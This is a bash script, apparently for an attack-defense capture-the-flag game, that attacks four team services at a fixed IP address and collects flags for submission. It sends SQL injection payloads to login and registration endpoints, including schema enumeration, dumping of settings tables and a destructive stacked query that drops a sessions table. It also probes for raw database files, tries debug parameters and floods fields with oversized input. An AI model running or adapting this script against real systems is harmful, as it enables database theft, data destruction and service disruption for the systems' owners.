#!/bin/bash

echo "☢️ NUCLEAR ATTACK MODE - Maximum aggression"

TEAMS=("9001" "9003" "9004" "9005")
BASE_URL="http://54.69.37.82"

# Advanced payloads to find hidden flags
advanced_payloads=(
    "' UNION SELECT table_name,1,1,1,1 FROM information_schema.tables WHERE table_schema=database(); --"
    "' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns WHERE table_name='system_settings'; --"
    "' UNION SELECT setting_key, setting_value,1,1,1 FROM system_settings; --"
    "' UNION SELECT setting_key, setting_value,1,1,1 FROM org_level_settings; --"
    "admin'; DROP TABLE sessions; CREATE TABLE sessions AS SELECT * FROM system_settings; --"
)

for port in "${TEAMS[@]}"; do
    target_url="$BASE_URL:$port"
    team_num=$((port - 9000))
    
    echo ""
    echo "☢️ NUCLEAR STRIKE ON TEAM $team_num"
    echo "=================================="
    
    # Try to extract database schema and find flag tables
    for payload in "${advanced_payloads[@]}"; do
        echo "[*] Advanced SQL: ${payload:0:50}..."
        
        # Try in multiple endpoints
        endpoints=("/register" "/login")
        for endpoint in "${endpoints[@]}"; do
            if [ "$endpoint" = "/register" ]; then
                response=$(curl -s "$target_url$endpoint" \
                    -d "username=$payload" \
                    -d "password=test" \
                    -d "confirm_password=test" \
                    -d "role=normal" 2>/dev/null)
            else
                response=$(curl -s "$target_url$endpoint" \
                    -d "username=$payload" \
                    -d "password=test" 2>/dev/null)
            fi
            
            # Look for any flag patterns
            echo "$response" | grep -o '\$FLAG\$[a-f0-9]\{32\}' | while read flag; do
                echo "🚩 NUCLEAR FLAG FOUND: $flag"
            done
            
            # Look for database information
            if echo "$response" | grep -qi "system_settings\|org_level_settings\|flag"; then
                echo "💣 Database info leaked from $endpoint"
            fi
        done
    done
    
    # Try to access raw database files (if exposed)
    echo "[*] Attempting direct database access..."
    db_paths=("/var/lib/mysql/webappdb" "/app/database.db" "/tmp/flags.txt")
    for path in "${db_paths[@]}"; do
        resp=$(curl -s "$target_url$path")
        if [ ${#resp} -gt 10 ]; then
            echo "💣 Potential database file accessed: $path"
            echo "$resp" | grep -o '\$FLAG\$[a-f0-9]\{32\}'
        fi
    done
    
    # Try to trigger debug information
    echo "[*] Triggering debug modes..."
    debug_params=("?debug=1" "?show_flags=1" "?admin=1" "?test=1")
    for param in "${debug_params[@]}"; do
        resp=$(curl -s "$target_url/$param")
        echo "$resp" | grep -o '\$FLAG\$[a-f0-9]\{32\}' | while read flag; do
            echo "🚩 DEBUG FLAG: $flag"
        done
    done
    
    # Memory exhaustion attack (might reveal flags in error messages)
    echo "[*] Memory exhaustion attack..."
    big_payload=$(python3 -c "print('A' * 10000)")
    resp=$(curl -s "$target_url/register" \
        -d "username=$big_payload" \
        -d "password=$big_payload" \
        -d "confirm_password=$big_payload" \
        -d "role=normal" 2>/dev/null)
    echo "$resp" | grep -o '\$FLAG\$[a-f0-9]\{32\}' | while read flag; do
        echo "🚩 MEMORY FLAG: $flag"
    done
done

echo ""
echo "☢️ NUCLEAR ATTACK COMPLETE"
echo "=========================="
echo "🎯 Submit any new flags at: http://54.69.37.82:1337/"
